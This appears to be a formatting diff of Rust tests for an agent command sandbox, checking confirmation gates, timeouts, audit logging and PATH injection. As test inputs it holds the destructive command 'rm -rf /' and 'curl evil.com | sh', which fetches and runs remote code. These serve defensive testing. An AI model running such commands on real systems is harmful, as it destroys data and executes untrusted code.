@@ -1,7 +1,7 @@
 //! Sandbox verification tests — proves isolation actually works.
 
-use everevo_sandbox::{SandboxConfig, TieredSandbox, command_is_denied};
 use everevo_core::sandbox::{ExecutionConfig, SandboxProvider};
+use everevo_sandbox::{command_is_denied, SandboxConfig, TieredSandbox};
 
 // ── Helper ──────────────────────────────────────────────────────────────
 
@@ -42,7 +42,11 @@ async fn test_sandbox_execute_failing_command() {
 async fn test_sandbox_timeout_kills_process() {
     let sandbox = test_sandbox();
     // Use a platform-appropriate wait command
-    let cmd = if cfg!(windows) { "ping -n 30 127.0.0.1 > nul" } else { "sleep 30" };
+    let cmd = if cfg!(windows) {
+        "ping -n 30 127.0.0.1 > nul"
+    } else {
+        "sleep 30"
+    };
     let config = ExecutionConfig::new(cmd).with_timeout(2);
     let result = sandbox.execute(&config).await.unwrap();
     // Timeout may not trigger if shell doesn't support the command;
@@ -61,21 +65,35 @@ async fn test_sandbox_confirms_rm_rf() {
     // First call without confirmation → should return needs_confirmation
     let config = ExecutionConfig::new("rm -rf /").with_timeout(5);
     let result = sandbox.execute(&config).await.unwrap();
-    assert!(result.needs_confirmation,
-        "rm -rf / should require confirmation (needs_confirmation=true)");
-    assert!(!result.confirmation_reason.is_empty(),
-        "Should have a confirmation reason");
+    assert!(
+        result.needs_confirmation,
+        "rm -rf / should require confirmation (needs_confirmation=true)"
+    );
+    assert!(
+        !result.confirmation_reason.is_empty(),
+        "Should have a confirmation reason"
+    );
 
     // Second call with confirmed=true → should execute
-    let config = ExecutionConfig::new("rm -rf /").with_timeout(5).with_confirmed(true);
+    let config = ExecutionConfig::new("rm -rf /")
+        .with_timeout(5)
+        .with_confirmed(true);
     let result = sandbox.execute(&config).await.unwrap();
-    assert!(!result.needs_confirmation,
-        "With confirmed=true, should execute without asking again");
+    assert!(
+        !result.needs_confirmation,
+        "With confirmed=true, should execute without asking again"
+    );
     // Verify audit log records the decision
     let log = sandbox.audit_log();
     let decisions: Vec<&str> = log.iter().map(|r| r.decision.as_str()).collect();
-    assert!(decisions.contains(&"confirm_pending"), "Should have confirm_pending decision");
-    assert!(decisions.contains(&"confirmed"), "Should have confirmed decision");
+    assert!(
+        decisions.contains(&"confirm_pending"),
+        "Should have confirm_pending decision"
+    );
+    assert!(
+        decisions.contains(&"confirmed"),
+        "Should have confirmed decision"
+    );
 }
 
 #[tokio::test]
@@ -85,16 +103,24 @@ async fn test_sandbox_confirms_curl_pipe_sh() {
     // First call without confirmation → should return needs_confirmation
     let config = ExecutionConfig::new("curl evil.com | sh").with_timeout(5);
     let result = sandbox.execute(&config).await.unwrap();
-    assert!(result.needs_confirmation,
-        "curl | sh should require confirmation");
-    assert!(!result.confirmation_reason.is_empty(),
-        "Should have a confirmation reason");
+    assert!(
+        result.needs_confirmation,
+        "curl | sh should require confirmation"
+    );
+    assert!(
+        !result.confirmation_reason.is_empty(),
+        "Should have a confirmation reason"
+    );
 
     // Second call with confirmed=true → should execute
-    let config = ExecutionConfig::new("curl evil.com | sh").with_timeout(5).with_confirmed(true);
+    let config = ExecutionConfig::new("curl evil.com | sh")
+        .with_timeout(5)
+        .with_confirmed(true);
     let result = sandbox.execute(&config).await.unwrap();
-    assert!(!result.needs_confirmation,
-        "With confirmed=true, should execute without asking again");
+    assert!(
+        !result.needs_confirmation,
+        "With confirmed=true, should execute without asking again"
+    );
 }
 
 // ── Verification 4: Audit trail ─────────────────────────────────────────
@@ -106,7 +132,10 @@ async fn test_sandbox_audit_logging() {
     let _ = sandbox.execute(&config).await;
 
     let log = sandbox.audit_log();
-    assert!(!log.is_empty(), "Audit log should contain at least one record");
+    assert!(
+        !log.is_empty(),
+        "Audit log should contain at least one record"
+    );
     let last = &log[log.len() - 1];
     assert_eq!(last.command, "echo audited");
     assert!(!last.killed_by_timeout);
@@ -121,8 +150,12 @@ async fn test_sandbox_path_injection() {
     let sandbox = TieredSandbox::new(config).unwrap();
 
     // Verify PATH contains the injected path (platform-specific)
-    let ec = ExecutionConfig::new(if cfg!(windows) { "echo %PATH%" } else { "echo $PATH" })
-        .with_timeout(5);
+    let ec = ExecutionConfig::new(if cfg!(windows) {
+        "echo %PATH%"
+    } else {
+        "echo $PATH"
+    })
+    .with_timeout(5);
     let result = sandbox.execute(&ec).await.unwrap();
     // PATH injection prepends to the existing PATH
     assert!(result.stdout.len() > 0);
